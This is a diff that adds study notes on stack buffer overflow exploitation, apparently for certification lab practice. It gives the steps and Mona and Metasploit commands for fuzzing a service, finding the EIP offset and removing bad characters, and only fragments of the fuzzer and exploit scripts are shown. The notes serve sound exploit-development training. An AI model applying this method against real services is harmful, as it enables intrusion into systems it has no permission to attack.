@@ -1,5 +1,15 @@
 Notes on Buffer Overflows
 
+### Basic Notes 
+Need to run Immunity Debugger as Admin.
+Make sure it's running.
+
+
+## Configure Mona
+#### Set up working folder
+```
+!mona config -set workingfolder c:\mona\%p
+```
 ### Python Fuzzer Script
 
 ```python
@@ -31,6 +41,16 @@ while True:
   time.sleep(1)
   ```
   
+##### Purpose of the Script
+The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. We need to write down how many bytes it sends and add 400 to help with with the exploit.
+
+##### After we know the value from the fuzzer, we can use Metasploit to create a cyclic pattern that we need for our exploit.
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (The number of bytes from the Fuzzer.py script + 400) 
+```
+
+##### Purpose of the Script
+The exploit script is used to crash the service and help find the EIP Offset.
   ### Python Exploit Script
   
 ```python 
@@ -59,11 +79,35 @@ try:
 except:
   print("Could not connect.")
 ```
+When we have the payload from the patter_create.rb script, we copy that into the payload variable and run the exploit script again. We then need to use Mona to help finish finding the EIP Offset.
+```
+!mona findmsp -distance (The number of bytes from the Fuzzer.py script + 400) 
+```
 
+###
+We need to update the exploit script.
+```python
+offset = (needs to be the EIP value we just found from the last step)
+retn = "BBBB"
+```
+
+### Finding Bad Chars
+
+The folliwn Mona command will generate a bytearray and exclude the null byte (\x00) by default. * Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).
+```
+!mona bytearray -b "\x00"
+```
+
+##### Purpose of the Script
+The following python script can be used to generate a string of bad chars from \x01 to \xff:
 ### Python Bad Chars Script
 
 ```python
 for x in range(1, 256):
   print("\\x" + "{:02x}".format(x), end='')
 print()
+```
+Once we run this, we use the output and update the exploit.py script payload variable with this output. Then run the exploit.py script again and start removing bad characters. We do this using Mona
+```
+!mona compare -f C:\mona\oscp\bytearray.bin -a (ESP Address)
 ```
